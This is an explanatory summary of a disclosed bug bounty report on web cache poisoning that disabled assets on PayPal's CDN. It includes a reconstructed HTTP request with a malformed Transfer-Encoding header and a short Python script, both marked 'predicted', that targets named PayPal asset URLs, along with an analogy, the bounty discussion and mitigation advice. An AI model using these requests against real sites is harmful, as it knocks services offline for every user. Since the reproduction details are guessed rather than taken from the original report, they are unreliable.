PayPal Web Cache Poisoning DoS Report

---

### 🛡️ Report Properties

| Key | Details |
| --- | --- |
| **ID** | #622122 |
| **Severity** | Medium (6.8) |
| **Bounty** | **$9,700** |
| **Weakness** | Uncontrolled Resource Consumption]] (Web Cache Poisoning) |
| **Reporter** | albinowax |
| **Company** | PayPal |
| **Asset** | paypal.com / [[[www.paypalobjects.com](https://www.google.com/search?q=https://www.paypalobjects.com)]] |
| **Disclosure Date** | October 23, 2019 |

---

### 📝 Overview

This report details a **Web Cache Poisoning** attack. Websites use "caches" (temporary storage) to deliver files faster. If an attacker can force the server to generate an error and convince the cache to store that error instead of the actual file, every user who tries to access that file will receive the error. In this case, [[albinowax]] caused PayPal's servers to return a `501 Not Implemented` error, which was then cached, effectively disabling critical JavaScript files and breaking the site for everyone.

---

### 💡 The "Bread Machine" Analogy

Imagine an **Automatic Bread Vending Machine** (The Cache Server) that gets its bread from a **Bakery** (The Origin Server).

1. **The Request**: A customer (Attacker) presses the button for "Croissant" but also jams a "Broken Metal Token" (Invalid Header) into the slot.
2. **The Error**: The Bakery sees the broken token and sends a "Machine Error: Cannot Process" slip back to the machine.
3. **The Poisoning**: The Vending Machine mistakenly thinks this error slip is the "Croissant" and puts it in the display window for everyone to see.
4. **The DoS**: Every normal customer who puts in a real coin and asks for a Croissant now gets the "Machine Error" slip instead of bread. The machine is now useless until the staff clears the cache.

---

### 🛠️ Reproduction Steps

The vulnerability was triggered by manipulating the `Transfer-Encoding` header via **Burp Suite**.

#### 1. Burp Suite Request (Predicted)

The attacker sends a request with a malformed header that the origin server rejects but the cache considers "cacheable."

```http
GET /en_US/i/scr/pixel.gif HTTP/1.1
Host: www.paypalobjects.com
Transfer-Encoding: x-invalid-header-value
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*


```

**Server Response (Cached):**

```http
HTTP/1.1 501 Not Implemented
Content-Type: text/html
Content-Length: 25
X-Cache: Miss
...
<h1>501 Not Implemented</h1>

```

*After this, the "Miss" becomes a "Hit," and all subsequent users see the 501 error.*

#### 2. Python PoC Script (Predicted)

This script automates the process of "poisoning" multiple assets to ensure the DoS remains active.

```python
import requests

# Target a specific sensitive JS file on PayPal's CDN
target_assets = [
    "https://www.paypalobjects.com/webstatic/en_US/sdk/js/sdk.js",
    "https://www.paypalobjects.com/en_US/i/scr/pixel.gif"
]

def poison_cache(url):
    # Malformed Transfer-Encoding triggers the 501 error
    headers = {'Transfer-Encoding': 'chunked-and-broken'}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 501:
            print(f"[+] Success: {url} is now poisoned with 501 error.")
        else:
            print(f"[-] Failed: Received status {r.status_code}")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    for asset in target_assets:
        poison_cache(asset)

```

---

### ⚖️ Discussion & Negotiation Summary

The dialogue between the reporter and [[PayPal]] highlights the nuances of bug bounty valuation:

* **Severity Flip-Flop**: The report started as **High**, was lowered to **Medium (5.3)** by triage, and eventually bumped back up to **Medium (6.8)**.
* **The "Impact" Argument**: The reporter argued that because `paypalobjects.com` serves the logic for the entire site, poisoning a few key JS files is equivalent to a full site shutdown (DoS).
* **Bounty Justification**: A **$9,700** reward for a [[Medium]] severity is rare. It was granted because the vulnerability allowed a single person to take down core PayPal functionality globally without needing massive bandwidth (unlike a traditional DDoS).

---

### 🛡️ Mitigation for Site Owners

To prevent Web Cache Poisoning, developers and DevOps engineers should:

1. **Refuse to Cache Errors**: Configure your CDN (Akamai, Cloudflare, etc.) to **never** cache `4xx` or `5xx` status codes.
2. **Standardize Headers**: Ensure the Cache and the Origin server interpret headers (like `Transfer-Encoding` or `Host`) in the exact same way.
3. **Use a Web Application Firewall (WAF)**: Block requests containing malformed or suspicious `Transfer-Encoding` headers at the edge.
4. **Vary Header Awareness**: Ensure the `Vary` header is used correctly so that different requests aren't served the same cached response incorrectly.

Source:https://hackerone.com/reports/622122
